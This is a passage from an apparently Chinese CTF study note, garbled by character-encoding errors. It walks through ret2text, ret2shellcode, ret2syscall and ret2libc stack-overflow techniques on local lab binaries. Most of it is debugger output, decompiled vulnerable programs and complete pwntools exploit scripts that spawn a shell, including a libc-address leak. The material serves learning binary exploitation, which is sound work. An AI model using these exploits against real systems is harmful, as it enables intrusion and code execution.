line 24.gefâž¤ rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf);â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ registers ]â”€â”€â”€â”€$eax : 0xffffcd5c â†’ 0x08048329 â†’ &quot;__libc_start_main&quot;$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 â†’ 0x00000000$esp : 0xffffcd40 â†’ 0xffffcd5c â†’ 0x08048329 â†’ &quot;__libc_start_main&quot;$ebp : 0xffffcdc8 â†’ 0x00000000$esi : 0xf7fae000 â†’ 0x001b1db0$edi : 0xf7fae000 â†’ 0x001b1db0$eip : 0x080486ae â†’ &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; æ–­ç‚¹ä¸‹åœ¨Callå¤„ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªCallå¤„ï¼Ÿ(æ–­ç‚¹å¤„çš„è¯­å¥è¿˜æ²¡æœ‰æ‰§è¡Œ)ï¼Œå¯ä»¥èŽ·å–espï¼Œebpçš„ç¡®åˆ‡å€¼ï¼Œå·²çŸ¥bufæœ€é«˜ç‚¹ç›¸å¯¹äºŽespçš„é•¿åº¦ï¼Œå¾—åˆ°bufæœ€é«˜ç‚¹ç¡®åˆ‡å€¼ï¼Œå¾—åˆ°bufæœ€é«˜ç‚¹ç›¸å¯¹äºŽebpçš„é•¿åº¦ï¼Œå†åŠ ä¸Š4å°±æ˜¯éœ€è¦å¡«å……çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚ æ¯æ¬¡åç¼–è¯‘å‡ºæ¥ï¼Œå¼€å¤´çš„ebp-xxéƒ½æ˜¯è¯¥bufçš„ç»“æŸä½ç½®ï¼Œè€Œä¸æ˜¯å¼€å§‹ä½ç½®(æ ˆæ˜¯ç”±é«˜å‘ä½Žç”Ÿé•¿çš„ï¼Œå‡äº†åè€Œè¦é«˜)ï¼Œè€Œå½“å‰çŠ¶æ€ä¸‹ebpæ˜¯æŒ‡å‘è¾“å…¥çš„ï¼Œæ‰€ä»¥bufçš„é•¿åº¦å°±ç­‰äºŽä¸¤è€…ç›¸å‡ã€‚è®¡ç®—é•¿åº¦ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¸¤åå…­è¿›åˆ¶æ•°ç›¸å‡å¾—åˆ°çš„åå…­è¿›åˆ¶åŠ ä¸Šä¸€ä¸ªåè¿›åˆ¶çš„4(32ä½çš„è¯)ã€‚ EXPå¦‚ä¸‹ï¼š 1234567891011##!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2text&apos;)target = 0x0804863ash.sendline(&apos;A&apos; * (0x6c+4) + p32(target))sh.interactive() æˆ‘è§‰å¾—è¿™é“é¢˜å€’æ˜¯è®©æˆ‘å¼„æ˜Žç™½äº†bufçš„è¡¨ç¤ºï¼Œä½ç½®å…³ç³»ã€‚ ä¸Šé¢è¿™ç§ç±»åž‹ï¼Œret2textï¼Œæ„æ€å°±æ˜¯è¿™ç§ç±»åž‹ä¸­ï¼Œå¯ä»¥æ‹¿åˆ°shellçš„ä»£ç è¯­å¥è¿žè´¯å­˜åœ¨äºŽtextä¸­ï¼Œå…³é”®åœ¨äºŽè®¡ç®—å‡ºé•¿åº¦ã€‚ ç¬¬äºŒç§ç±»åž‹ret2shellcodeï¼š ret2shellcodeï¼Œå³æŽ§åˆ¶ç¨‹åºæ‰§è¡Œ shellcode ä»£ç ã€‚shellcode æŒ‡çš„æ˜¯ç”¨äºŽå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯èŽ·å–ç›®æ ‡ç³»ç»Ÿçš„ shellã€‚ä¸€èˆ¬æ¥è¯´ï¼Œshellcode éœ€è¦æˆ‘ä»¬è‡ªå·±å¡«å……ã€‚è¿™å…¶å®žæ˜¯å¦å¤–ä¸€ç§å…¸åž‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œå³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªå·±åŽ»å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç ã€‚åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æƒ³æ‰§è¡Œ shellcodeï¼Œéœ€è¦å¯¹åº”çš„ binary åœ¨è¿è¡Œæ—¶ï¼Œshellcode æ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™(æœªå¼€å¯NXä¿æŠ¤ï¼Œæ€Žä¹ˆè®²çš„è¶Šæ¥è¶Šä½Žçº§äº†çš„è¯´)ã€‚æ­¤æ¬¡æ–‡ä»¶çš„segmentsæ˜¯NX disabledï¼ŒRWXï¼Œå°†shellcodeå†™å…¥bssæ®µä¸­ã€‚èŽ·å¾—æ‰§è¡Œsystem(â€œ/bin/shâ€)æ±‡ç¼–ä»£ç æ‰€å¯¹åº”çš„æœºå™¨ç ï¼šasm(shellcraft.sh())ã€‚ 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets((char *)&amp;v4); strncpy(buf2, (const char *)&amp;v4, 0x64u); printf(&quot;bye bye ~&quot;); return 0;&#125; ç¨‹åºä»ç„¶æ˜¯åŸºæœ¬çš„æ ˆæº¢å‡ºæ¼æ´žï¼Œä¸è¿‡è¿™æ¬¡è¿˜åŒæ—¶å°†å¯¹åº”çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° buf2 å¤„ã€‚ç®€å•æŸ¥çœ‹å¯çŸ¥ buf2 åœ¨ bss æ®µ(åŒå‡»ï¼Œhh)ã€‚ 12.bss:0804A080 public buf2.bss:0804A080 ; char buf2[100] é€šè¿‡vmmapè§‚å¯Ÿè¯¥bssæ®µæ˜¯å¦å¯æ‰§è¡Œï¼š 12345678910111213141516171819202122232425262728293031323334gefâž¤ b mainBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.gefâž¤ rStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:88 setvbuf(stdout, 0LL, 2, 0LL);â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ source:ret2shellcode.c+8 ]â”€â”€â”€â”€ 6 int main(void) 7 &#123; â†’ 8 setvbuf(stdout, 0LL, 2, 0LL); 9 setvbuf(stdin, 0LL, 1, 0LL); 10 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ trace ]â”€â”€â”€â”€[#0] 0x8048536 â†’ Name: main()â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€gefâž¤ vmmap Start End Offset Perm Path0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so0xfffdd000 0xffffe000 0x00000000 rwx [stack] æ‰€åœ¨åŒºé—´ä¸ºrwxï¼Œé‚£ä¹ˆå¯¹äºŽæ­¤ç±»åž‹å°±æŽ§åˆ¶ç¨‹åºå†™å…¥shellcodeï¼Œå†æ‰§è¡Œshellcodeã€‚ EXPå¦‚ä¸‹: 123456789#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2shellcode&apos;)## è‡ªåŠ¨ç”Ÿæˆshellcodeshellcode = asm(shellcraft.sh())buf2_addr = 0x804a080## shellcodeå…ˆæ”¾å…¥ï¼Œå‰©ä½™çš„å†ç”¨&apos;A&apos;å¡«å……è‡³112é•¿åº¦ã€‚sh.sendline(shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr))sh.interactive() shellcodeæ”¾è¿›åŽ»äº†ä¸éœ€è¦åˆ«çš„æ“ä½œå—ï¼Ÿè¿™ä¸ªbuf2_addræŒ‡çš„æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•é€šè¿‡è°ƒè¯•ç¡®å®šéœ€è¦å¡«å……çš„é•¿åº¦ï¼Ÿ ç¬¬ä¸‰ç§ç±»åž‹ï¼šret2syscallï¼šå³æŽ§åˆ¶å‡½æ•°æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ã€‚ç®€å•åœ°è¯´ï¼Œåªè¦æŠŠå¯¹åº”èŽ·å– shell çš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æ‰§è¡Œ int 0x80 å°±å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚æ¯”å¦‚è¯´è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹ç³»ç»Ÿè°ƒç”¨æ¥èŽ·å– shellã€‚ 1execve(&quot;/bin/sh&quot;,NULL,NULL) ç”±äºŽè¯¥ç¨‹åºæ˜¯ 32 ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿å¾— ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xb ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ /bin/sh çš„åœ°å€ï¼Œå…¶å®žæ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚ ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0 ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0 è€Œæˆ‘ä»¬å¦‚ä½•æŽ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼ å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦ä½¿ç”¨ gadgetsã€‚æ¯”å¦‚è¯´ï¼ŒçŽ°åœ¨æ ˆé¡¶æ˜¯ 10ï¼Œé‚£ä¹ˆå¦‚æžœæ­¤æ—¶æ‰§è¡Œäº† pop eaxï¼Œé‚£ä¹ˆçŽ°åœ¨ eax çš„å€¼å°±ä¸º 10ã€‚ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½æœŸå¾…æœ‰ä¸€æ®µè¿žç»­çš„ä»£ç å¯ä»¥åŒæ—¶æŽ§åˆ¶å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€æ®µä¸€æ®µæŽ§åˆ¶ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨ gadgets æœ€åŽä½¿ç”¨ ret æ¥å†æ¬¡æŽ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹çš„åŽŸå› ã€‚ å…·ä½“å®žçŽ°â€“ropgadgets è¿™ä¸ªå·¥å…·: only â€˜pop|retâ€™ | grep â€˜eaxâ€™è¿™ç±»çš„å‘½ä»¤(å‰é¢æ±‡ç¼–æŒ‡ä»¤ï¼ŒåŽé¢å¯„å­˜å™¨åã€‚)æ‰¾åˆ°gadgetsï¼Œæ‰¾åˆ°èƒ½ç¬¦åˆæ¡ä»¶æ”¹å˜eaxï¼Œebxï¼Œecxï¼Œedxçš„è¯­å¥ï¼Œå®žçŽ°execve(â€œ/bin/shâ€,NULL,NULL)æ­¤ç³»ç»Ÿè°ƒç”¨æ‰€éœ€è¦æ”¹å˜å››ç§å¯„å­˜å™¨çš„å€¼ã€‚å†å¯»æ‰¾å­—ç¬¦ä¸²/bin/shçš„åœ°å€ä»¥åŠå‘½ä»¤int 0x80çš„åœ°å€ã€‚ä¸åŒçš„ç³»ç»Ÿè°ƒç”¨æ‰€éœ€è¦æ”¹å˜çš„å¯„å­˜å™¨ä¸ªæ•°ä¸Žå‚æ•°æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥è¦å¯»æ‰¾çš„gadgetsä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ã€‚ å¹³å‡¡æ— å¥‡çš„å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´žçš„ç¨‹åºæºç å¦‚ä¸‹ï¼š 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;); puts(&quot;What do you plan to do?&quot;); gets(&amp;v4); return 0;&#125; æƒ³çŸ¥é“108+4æ˜¯æ€Žä¹ˆç®—å‡ºæ¥çš„ï¼Œä»¥åŠbufçš„å‰åŽä¸¤ç«¯è¡¨ç¤ºæ–¹æ³•ï¼Œè¯•ä¸€è¯•ã€‚ æ­¤å¤–ï¼Œæˆ‘ä»¬éœ€è¦èŽ·å¾— /bin/sh å­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€ã€‚ 1234âžœ ret2syscall ROPgadget --binary rop --string &apos;/bin/sh&apos; Strings information============================================================0x080be408 : /bin/sh ä»¥åŠint 0x80çš„åœ°å€ï¼š 123456789âžœ ret2syscall ROPgadget --binary rop --only &apos;int&apos; Gadgets information============================================================0x08049421 : int 0x800x080938fe : int 0xbb0x080869b5 : int 0xf60x0807b4d4 : int 0xfcUnique gadgets found: 4 EXPå¦‚ä¸‹ï¼š 123456789101112131415#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./rop&apos;)## æ‰¾åˆ°çš„gadgetsåŠå…¶åœ°å€pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408## flatè¡¨ç¤ºè¿žæŽ¥ï¼Œæ³¨æ„æ­¤å¤„ä¸æ˜¯æŒ‡ä»¤æ˜¯åœ°å€ï¼Œæ ˆä¸­åªæœ‰åœ°å€ä¸Žå‚æ•°ï¼Œè¿™ç§ç±»åž‹æ¯”è¾ƒå¥‡ç‰¹ã€‚## æ³¨æ„popï¼Œretç­‰æŒ‡ä»¤çš„å®žé™…æ„ä¹‰ï¼ŒåŽé¢æŽ¥çš„æ˜¯å®ƒä»¬çš„å‚æ•°ï¼Œå…¶ä¸­ 0xb ä¸º execve å¯¹## åº”çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚payload = flat([&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() payload = flat([â€˜Aâ€™ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])ï¼Œpop eaxæ˜¯æŠŠæ ˆé¡¶çš„æ•°å­—å…ˆèµ‹ç»™eaxï¼Œå†å¼¹å‡º/é‡Šæ”¾ã€‚ ç¬¬å››ç§ç±»åž‹ï¼šret2libc libcæ˜¯Linuxçš„å‡½æ•°åº“ï¼Œret2libcå°±æ˜¯æŽ§åˆ¶ç¨‹åºæ‰§è¡Œlibcä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯ä¿®æ”¹å‡½æ•°è¿”å›žåœ°å€ä¸ºæŸä¸ªå‡½æ•°çš„pltå¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½®(å‡½æ•°å¯¹åº”çš„gotè¡¨é¡¹å†…å®¹)ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œsystem(â€œ/bin/shâ€). 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;RET2LIBC &gt;_&lt;&quot;); gets((char *)&amp;v4); return 0;&#125; ç¡®å®šå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ž,ç”¨IDAæ‰¾åˆ°äº†systemå‡½æ•°,ç”¨ropgadgetæŸ¥æ‰¾åˆ°â€/bin/shâ€ã€‚ åˆ™EXPå¦‚ä¸‹ï¼š 1234567891011#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2libc1&apos;)binsh_addr = 0x8048720system_plt = 0x08048460payload = flat([&apos;a&apos; * 112, system_plt, &apos;b&apos; * 4, binsh_addr])sh.sendline(payload)sh.interactive() è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„å‡½æ•°è°ƒç”¨æ ˆçš„ç»“æž„ï¼Œå¦‚æžœæ˜¯æ­£å¸¸è°ƒç”¨ system å‡½æ•°ï¼Œæˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„è¿”å›žåœ°å€ï¼Œè¿™é‡Œä»¥â€™bbbbâ€™ ä½œä¸ºè™šå‡çš„åœ°å€ï¼Œå…¶åŽå‚æ•°å¯¹åº”çš„å‚æ•°å†…å®¹ã€‚ å½“æŸ¥æ‰¾ä¸åˆ°â€/bin/shâ€æ—¶ï¼Œéœ€è¦æˆ‘ä»¬æ¥è‡ªå·±è¯»å–å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦ä¸¤ä¸ªgadgetï¼Œç¬¬ä¸€ä¸ªç”¨æ¥æŽ§åˆ¶ç¨‹åºè¯»å–å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªç”¨æ¥æŽ§åˆ¶ç¨‹åºæ‰§è¡Œsystemå‡½æ•°ã€‚è¿™ç§æƒ…å†µçš„è§£å†³åŠžæ³•å°±æ˜¯å‘ç¨‹åºç§bssæ®µçš„buf2å¤„å†™å…¥å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶åœ°å€ä½œä¸ºå‚æ•°ä¼ ç»™system()å‡½æ•°ã€‚ EXPå¦‚ä¸‹ï¼š 12345678910111213##!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2libc2&apos;)gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat([&apos;a&apos; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline(&apos;/bin/sh&apos;)sh.interactive() æ³¨æ„payloadä¸­çš„pop_ebxæ˜¯ç”¨æ¥å¹³è¡¡å †æ ˆçš„ã€‚ åŒæ—¶æ‰¾ä¸åˆ°â€/bin/shâ€ä¸Žsystem()å‡½æ•°åœ°å€çš„æƒ…å†µï¼Œç”¨åˆ°äº†ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š system å‡½æ•°å±žäºŽ libcï¼Œè€Œ libc.so åŠ¨æ€é“¾æŽ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚ å³ä½¿ç¨‹åºæœ‰ ASLR ä¿æŠ¤ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºŽåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½Žçš„ 12 ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œè€Œ libc åœ¨ github ä¸Šæœ‰äººè¿›è¡Œæ”¶é›†ï¼Œå¯ä»¥ç”¨ç½‘ç«™æŸ¥æ‰¾ï¼Œç”¨pwntoolsä¸­çš„å·¥å…·æŸ¥æ‰¾ã€‚ æ‰€ä»¥å¦‚æžœé‡‡ç”¨gotè¡¨æ³„éœ²(å³è¾“å‡ºæŸä¸ªå‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)çš„æ–¹æ³•ï¼Œæ³„éœ²å‡ºäº†libcä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œå°±èƒ½å¤Ÿç¡®å®šlibcçš„ç‰ˆæœ¬å·ã€‚ç”±äºŽlibcçš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„åœ°å€ã€‚ä½¿ç”¨LibcSearcherå·¥å…·å¯ç®€åŒ–æ“ä½œæµç¨‹ã€‚ æ­¤å¤–ï¼Œlibcä¸­æ˜¯ä¸€å®šå­˜åœ¨â€/bin/shâ€çš„ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²åœ°å€ä¹Ÿå¯ä»¥èŽ·å–ã€‚è¿™æ–¹é¢å·¥å…·åšçš„å¾ˆå®Œå–„ã€‚ ç¤ºä¾‹ï¼š 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No surprise anymore, system disappeard QQ.&quot;); printf(&quot;Can you find it !?&quot;); gets((char *)&amp;v4); return 0;&#125; æ€è·¯ï¼š æ³„éœ² __libc_start_main åœ°å€ èŽ·å– libc ç‰ˆæœ¬ èŽ·å– system åœ°å€ä¸Ž /bin/sh çš„åœ°å€ å†æ¬¡æ‰§è¡Œæºç¨‹åº è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™) EXPå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom pwn import *## å¯¼å…¥å·¥å…·from LibcSearcher import LibcSearcher## æœ¬åœ°è¿žæŽ¥sh = process(&apos;./ret2libc3&apos;)## å°†æ–‡ä»¶åŠ è½½å…¥è¿›ç¨‹ret2libc3 = ELF(&apos;./ret2libc3&apos;)##ç®€åŒ–libcåº“ä¸­å‡½æ•°åœ°å€çš„è¡¨ç¤ºæ–¹æ³•puts_plt = ret2libc3.plt[&apos;puts&apos;]libc_start_main_got = ret2libc3.got[&apos;__libc_start_main&apos;]main = ret2libc3.symbols[&apos;main&apos;]## ç›‘è§†ç¨‹åºè¿›è¡Œåˆ°å“ªä¸€æ­¥ï¼Œæé†’è‡ªå·±print &quot;leak libc_start_main_got addr and return to main again&quot;## putså‡½æ•°æ³„éœ²å‡ºstart_mainå‡½æ•°åœ°å€payload = flat([&apos;A&apos; * 112, puts_plt, main, libc_start_main_got])## åœ¨è¾“å‡ºå‰é¢å­—ç¬¦ä¸²åŽï¼Œå°†payloadè¾“å…¥sh.sendlineafter(&apos;Can you find it !?&apos;, payload)print &quot;get the related addr&quot;##å°†æŽ¥æ”¶åˆ°çš„putså‡½æ•°çš„è¾“å‡ºï¼Œç»è¿‡u32ç”±æœºå™¨ç è½¬æ¢æˆå¸¸è§çš„åœ°å€å½¢å¼libc_start_main_addr = u32(sh.recv()[0:4])##é€šè¿‡å‡½æ•°åä¸Žå‡½æ•°åœ°å€ä½œä¸ºå‚æ•°ï¼Œç”¨LibcSearcheræ‰¾åˆ°libcç‰ˆæœ¬å·ã€‚libc = LibcSearcher(&apos;__libc_start_main&apos;, libc_start_main_addr)## æ³„éœ²å‡ºlibcä¸­start_main()å‡½æ•°åœ°å€ï¼Œå‡åŽ»ç›¸å¯¹åœ°å€ï¼Œå¾—åŸºåœ°å€ã€‚libcbase = libc_start_main_addr - libc.dump(&apos;__libc_start_main&apos;)## å·²çŸ¥åŸºåœ°å€ä¸Žç›¸å¯¹åœ°å€ï¼Œå¾—åˆ°ç»å¯¹åœ°å€system_addr = libcbase + libc.dump(&apos;system&apos;)binsh_addr = libcbase + libc.dump(&apos;str_bin_sh&apos;)## ç›‘è§†ç¨‹åºè¿›è¡Œåˆ°å“ªä¸€æ­¥print &quot;get shell&quot;payload = flat([&apos;A&apos; * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive() 0X05â€“ç¨ä½œæ€»ç»“ï¼š ret2textï¼Œret2shellcodeï¼Œret2syscallï¼Œret2libcå››ç§ç±»åž‹ï¼Œç¬¬å››ç§æœ€å¸¸ç”¨ï¼Œç¬¬ä¸€ç§å’Œç¬¬ä¸‰ç§æ„Ÿè§‰æœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œç¬¬ä¸‰ç§æ¯”è¾ƒå¥‡æ€ªï¼Œæ‰€ä»¥ç”¨çš„æœ€å°‘ã€‚ 0X06â€“MISC: 1.æœ€ç®€å•æ ˆæº¢å‡ºï¼Œä¸€å¥—å·¥å…·è§£å†³ã€‚ python pattern.py create 150 gdb X run (input) q(uit) python pattern.py offset (address) å³å¯å¾—åˆ°æº¢å‡ºåœ°å€ 2.æ³¨æ„æ˜¯è¿”å›žåœ°å€ï¼Œä¸æ˜¯/bin/shæœ¬èº«åœ¨æ ˆä¸Šã€‚ 3.å†æ¬¡æŸ¥æ‰¾ä¸€ä¸‹æ˜¯å¦æœ‰ system å‡½æ•°å­˜åœ¨ã€‚ç»åœ¨ ida ä¸­æŸ¥æ‰¾ï¼Œç¡®å®žä¹Ÿå­˜åœ¨ã€‚ï¼ˆæ‰‹åŠ¨è§‚å¯Ÿå·¦ä¸Šè§’çª—å£ä¸­çš„å‡½æ•°åï¼Œå¯¹mainå‡½æ•°å’Œsystemå‡½æ•°åŠä¸€äº›å®¹æ˜“é€ æˆæº¢å‡ºçš„å‡½æ•°åŠ ä»¥æ³¨æ„ã€‚ä»¥åŠé¢˜ç›®ä¸­å¯èƒ½ä¼šæœ‰hintå’Œbackdoorä½œä¸ºå‡½æ•°åï¼‰ã€‚ 4.flatä¸­çš„å­—ç¬¦éƒ½æ˜¯ä¸€æ¬¡æ€§å‘è¿‡åŽ»çš„ï¼Œé™æ€å­˜å‚¨ï¼Œåœ¨æ ˆç©ºé—´æœ‰è¶³å¤Ÿé•¿çš„çš„åœ°å€ã€‚ 5.å…·ä½“çš„é“¾å†…éƒ¨çš„æŽ§åˆ¶ï¼Œæ¯æ¬¡å¸ƒç½®å¥½è¿”å›žåœ°å€çš„å®žçŽ°ï¼šå¯ä»¥æ˜¯ä¸€é•¿ä¸²å­—ç¬¦ï¼Œä¸»è°ƒå‡½æ•°åœ°å€+pop ebxï¼ˆå †æ ˆå¹³è¡¡ï¼‰+buf+è¢«è°ƒå‡½æ•°åœ°å€ï¼Œä¸¤æ¬¡ä»¥ä¸Šçš„å‡½æ•°è°ƒç”¨ä¸€å®šè¦åšåˆ°å †æ ˆå¹³è¡¡ã€‚æœ€åŽä¸€ä¸ªè°ƒç”¨çš„å‡½æ•°ä¸€èˆ¬éƒ½æ˜¯systemå‡½æ•°ï¼Œä¸éœ€è¦è¿”å›žåœ°å€ä½œä¸ºå‚æ•°ï¼Œåªéœ€è¦è¾“å…¥â€œ/bin/shâ€çš„åœ°å€ä½œä¸ºå‚æ•°ã€‚ 6.r.sendlineuntil(â€˜AAAâ€™,payloadï¼‰è¡¨ç¤ºç›´åˆ°è¿”å›žäº†AAAå­—ç¬¦ä¸²è¿›è¡Œè¾“å…¥ã€‚ 